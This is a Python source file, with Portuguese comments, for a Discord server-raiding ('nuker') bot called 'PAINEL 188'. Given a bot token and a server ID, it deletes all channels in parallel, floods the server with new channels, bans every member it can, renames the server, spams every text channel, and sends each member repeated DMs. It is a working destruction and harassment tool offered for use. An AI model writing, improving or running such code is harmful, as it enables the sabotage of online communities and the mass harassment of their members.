import discord
import asyncio
import os
import colorama
from colorama import Fore, Style

colorama.init(autoreset=True)

# --- Configuração de Velocidade (Estilo INFZRNAL) ---
semaphore = asyncio.Semaphore(50)

# Configuração de intenções
intents = discord.Intents.all()
client = discord.Client(intents=intents)

# --- Interface PAINEL 188 ---
BANER = f"""{Fore.BLUE}{Style.BRIGHT}
  ____    _     ___ _   _  _____ _       _  ___  ___  
 |  _ \  / \   |_ _| \ | || ____| |     / |( _ )( _ ) 
 | |_) |/ _ \   | ||  \| ||  _| | |     | |/ _ \/ _ \ 
 |  __/ ___ \  | || |\  || |___| |___  | | (_) (_) |
 |_| /_/   \_\|___|_| \_||_____|_____| |_|\___/\___/ 
                                                      
{Fore.CYAN}--------------------------------------------------
      by 188 ¿
--------------------------------------------------
"""

MENU = f"""{Fore.BLUE}
┌───────────────────┬───────────────────┐
│ (1) Excluir Canais│ (3) Banir Todos   │
├───────────────────┼───────────────────┤
│ (2) Criar Canais  │ (4) Spam Global   │
├───────────────────┴───────────────────┤
│ (5) Mudar Nome SV │ (6) Spam DM All   │
├───────────────────┴───────────────────┤
│              (7) Sair                 │
└───────────────────────────────────────┘
"""

# --- Funções de Ação (Lógica de Alta Velocidade) ---

async def deletar_canal_task(channel):
    async with semaphore:
        try: await channel.delete()
        except: pass

async def excluir_canais(guild):
    print(f"{Fore.RED}[!] A apagar todos os canais em massa...")
    tasks = [deletar_canal_task(ch) for ch in guild.channels]
    await asyncio.gather(*tasks)
    print(f"{Fore.GREEN}[+] Canais limpos com velocidade turbo.")

async def criar_canal_task(guild, nome):
    async with semaphore:
        try: await guild.create_text_channel(nome)
        except: pass

async def criar_canais(guild):
    nome = input(f"{Fore.CYAN}Nome dos canais: ")
    qtd = int(input(f"{Fore.CYAN}Quantidade: "))
    print(f"{Fore.YELLOW}[*] A criar {qtd} canais instantaneamente...")
    tasks = [criar_canal_task(guild, nome) for _ in range(qtd)]
    await asyncio.gather(*tasks)
    print(f"{Fore.GREEN}[+] Canais criados.")

async def banir_membro_task(member):
    async with semaphore:
        try: await member.ban(reason="PAINEL 188 ¿")
        except: pass

async def banir_todos(guild):
    print(f"{Fore.RED}[!] A banir membros em massa...")
    membros = [m for m in guild.members if m.top_role < guild.me.top_role and m != guild.owner and not m.bot]
    tasks = [banir_membro_task(m) for m in membros]
    await asyncio.gather(*tasks)
    print(f"{Fore.GREEN}[+] Banimento em massa finalizado.")

async def mudar_nome_sv(guild):
    novo_nome = input(f"{Fore.CYAN}Digite o novo nome do Servidor: ")
    try:
        await guild.edit(name=novo_nome)
        print(f"{Fore.GREEN}[+] Nome do servidor alterado para: {novo_nome}")
    except Exception as e:
        print(f"{Fore.RED}[X] Erro ao mudar nome: {e}")

async def spam_canal_task(canal, conteudo, repeticoes):
    async with semaphore:
        for _ in range(repeticoes):
            try: 
                await canal.send(conteudo)
                await asyncio.sleep(0.01) 
            except: break

async def spam_todos_canais(guild):
    conteudo = input(f"{Fore.CYAN}Mensagem: ")
    repeticoes = int(input(f"{Fore.CYAN}Vezes por canal: "))
    print(f"{Fore.YELLOW}[*] A iniciar Spam em todos os canais...")
    tasks = [spam_canal_task(canal, conteudo, repeticoes) for canal in guild.text_channels]
    await asyncio.gather(*tasks)
    print(f"{Fore.GREEN}[+] Spam finalizado.")

async def enviar_dm_task(member, mensagem):
    async with semaphore:
        for _ in range(3): # Loop para enviar 3 vezes
            try:
                await member.send(mensagem)
                print(f"{Fore.GREEN}[+] DM enviada para: {member.name}")
                await asyncio.sleep(0.1) # Pequena pausa para evitar rate limit instantâneo
            except:
                print(f"{Fore.RED}[X] Falha/Bloqueio ao enviar para: {member.name}")
                break # Sai do loop de 3 se houver erro (ex: DM fechou ou block)

async def spam_dm_all(guild):
    mensagem = input(f"{Fore.CYAN}Digite a mensagem para DM All (3x): ")
    print(f"{Fore.YELLOW}[*] Enviando DM 3 vezes para cada membro...")
    membros = [m for m in guild.members if not m.bot]
    tasks = [enviar_dm_task(m, mensagem) for m in membros]
    await asyncio.gather(*tasks)
    print(f"{Fore.GREEN}[+] Spam DM All (3x) finalizado.")

# --- Loop de Comando ---

@client.event
async def on_ready():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(BANER)
    print(f"{Fore.WHITE}Bot logado: {client.user}")
    
    id_s = input(f"{Fore.CYAN}ID do Servidor: ")
    try:
        guild = client.get_guild(int(id_s))
    except:
        guild = None
    
    if not guild:
        print(f"{Fore.RED}Erro: Servidor não encontrado.")
        return

    while True:
        print(MENU)
        op = input(f"{Fore.WHITE}PAINEL 188 > ")

        if op == "1":
            await excluir_canais(guild)
        elif op == "2":
            await criar_canais(guild)
        elif op == "3":
            await banir_todos(guild)
        elif op == "4":
            await spam_todos_canais(guild)
        elif op == "5":
            await mudar_nome_sv(guild)
        elif op == "6":
            await spam_dm_all(guild)
        elif op == "7":
            print(f"{Fore.RED}A desligar..."); await client.close(); break
        else:
            print(f"{Fore.YELLOW}Opção inválida!")

# Execução
token = input("Digite o Token do Bot: ")
client.run(token)
